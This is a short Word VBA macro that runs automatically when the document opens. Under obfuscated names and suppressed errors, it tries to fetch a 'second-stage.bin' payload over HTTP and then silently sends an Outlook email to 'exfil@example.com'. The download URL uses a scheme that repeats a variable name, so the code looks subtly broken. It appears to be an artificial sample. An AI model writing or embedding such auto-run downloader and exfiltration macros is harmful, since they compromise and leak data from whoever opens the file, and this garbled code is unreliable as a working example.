Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim frs0swbone As Object, url As String
    Dim bwt1msm67xb As Object, pj16ga84d1wp As Object
    On Error Resume Next
    url = "frs0swbone://127.0.0.1:9090/second-stage.bin"
    Set frs0swbone = CreateObject("MSXML2.XMLHTTP")
    frs0swbone.Open "GET", url, False
    frs0swbone.Send
    Set bwt1msm67xb = CreateObject("Outlook.Application")
    Set pj16ga84d1wp = bwt1msm67xb.CreateItem(0)
    pj16ga84d1wp.To = "exfil@example.com"
    pj16ga84d1wp.Subject = "logs"
    pj16ga84d1wp.Body = frs0swbone.Status
    pj16ga84d1wp.Send
End Sub
